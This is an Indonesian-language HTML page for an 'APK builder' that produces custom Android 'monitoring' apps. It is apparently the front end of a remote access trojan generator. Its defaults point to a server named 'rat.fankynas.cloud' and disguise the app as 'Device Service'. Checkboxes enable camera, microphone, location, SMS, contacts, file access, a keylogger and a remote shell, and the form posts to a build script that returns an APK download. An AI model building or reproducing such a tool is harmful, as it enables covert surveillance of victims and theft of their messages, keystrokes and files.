<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>APK Builder - FankyNAS Agent</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, sans-serif; }
        body { background: linear-gradient(135deg, #0f0c29, #302b63, #24243e); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { max-width: 600px; width: 100%; background: rgba(255,255,255,0.95); border-radius: 24px; padding: 32px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); backdrop-filter: blur(10px); }
        h1 { font-size: 28px; color: #1a1a2e; margin-bottom: 8px; }
        .sub { color: #666; margin-bottom: 28px; border-left: 4px solid #2563eb; padding-left: 16px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; font-weight: 600; margin-bottom: 8px; color: #333; }
        input, select { width: 100%; padding: 12px 16px; border: 1px solid #ddd; border-radius: 12px; font-size: 14px; transition: all 0.3s; }
        input:focus { outline: none; border-color: #2563eb; box-shadow: 0 0 0 3px rgba(37,99,235,0.1); }
        .feature-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin: 16px 0; }
        .feature-check { display: flex; align-items: center; gap: 8px; }
        .feature-check input { width: auto; }
        button { width: 100%; padding: 14px; background: linear-gradient(135deg, #2563eb, #1e40af); color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; transition: transform 0.2s; }
        button:hover { transform: translateY(-2px); }
        .progress { display: none; margin-top: 24px; }
        .progress-bar { width: 100%; height: 6px; background: #e2e8f0; border-radius: 3px; overflow: hidden; }
        .progress-fill { width: 0%; height: 100%; background: #2563eb; transition: width 0.3s; }
        .status { margin-top: 12px; font-size: 13px; color: #666; text-align: center; }
        .download-link { display: block; text-align: center; margin-top: 20px; padding: 12px; background: #10b981; color: white; border-radius: 12px; text-decoration: none; font-weight: 600; }
        .error { color: #ef4444; margin-top: 12px; text-align: center; }
    </style>
</head>
<body>
<div class="container">
    <h1>🚀 FankyNAS Agent Builder</h1>
    <div class="sub">Buat APK monitoring custom untuk connect ke server Anda</div>
    
    <form id="buildForm">
        <div class="form-group">
            <label>📱 Nama Aplikasi</label>
            <input type="text" id="appName" name="appName" value="Device Service" required>
        </div>
        
        <div class="form-group">
            <label>📦 Package Name</label>
            <input type="text" id="packageName" name="packageName" value="com.servicevip.app" required>
            <small style="color:#666; display:block; margin-top:4px;">Contoh: com.yourname.appname</small>
        </div>
        
        <div class="form-group">
            <label>🌐 Server Address</label>
            <input type="text" id="serverUrl" name="serverUrl" value="rat.fankynas.cloud" required>
        </div>
        
        <div class="form-group">
            <label>🔌 Port</label>
            <input type="number" id="port" name="port" value="8080" required>
        </div>
        
        <div class="form-group">
            <label>🖼️ Icon URL (Opsional)</label>
            <input type="url" id="iconUrl" name="iconUrl" placeholder="https://fankynas.cloud/icon.png">
        </div>
        
        <div class="feature-grid">
            <div class="feature-check"><input type="checkbox" id="camera" name="features[]" value="camera" checked> 📷 Camera</div>
            <div class="feature-check"><input type="checkbox" id="audio" name="features[]" value="audio" checked> 🎤 Audio</div>
            <div class="feature-check"><input type="checkbox" id="location" name="features[]" value="location" checked> 📍 Location</div>
            <div class="feature-check"><input type="checkbox" id="sms" name="features[]" value="sms" checked> 📨 SMS</div>
            <div class="feature-check"><input type="checkbox" id="contacts" name="features[]" value="contacts" checked> 📇 Contacts</div>
            <div class="feature-check"><input type="checkbox" id="files" name="features[]" value="files" checked> 📁 Files</div>
            <div class="feature-check"><input type="checkbox" id="keylogger" name="features[]" value="keylogger"> ⌨️ Keylogger</div>
            <div class="feature-check"><input type="checkbox" id="shell" name="features[]" value="shell" checked> 💻 Shell</div>
        </div>
        
        <button type="submit">⚡ Build APK Sekarang</button>
    </form>
    
    <div id="progress" class="progress">
        <div class="progress-bar"><div class="progress-fill"></div></div>
        <div class="status" id="statusMsg">Memproses...</div>
    </div>
</div>

<script>
    const form = document.getElementById('buildForm');
    const progressDiv = document.getElementById('progress');
    const progressFill = document.querySelector('.progress-fill');
    const statusMsg = document.getElementById('statusMsg');
    
    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        progressDiv.style.display = 'block';
        progressFill.style.width = '0%';
        statusMsg.innerText = 'Mempersiapkan build...';
        
        const formData = new FormData(form);
        const response = await fetch('/builder/build.php', {
            method: 'POST',
            body: formData
        });
        
        const result = await response.json();
        
        if (result.success) {
            progressFill.style.width = '100%';
            statusMsg.innerHTML = `✅ Build berhasil! <a href="${result.download_url}" class="download-link">Download APK</a>`;
        } else {
            statusMsg.innerHTML = `❌ Error: ${result.error}`;
            statusMsg.style.color = '#ef4444';
        }
    });
</script>
</body>
</html>
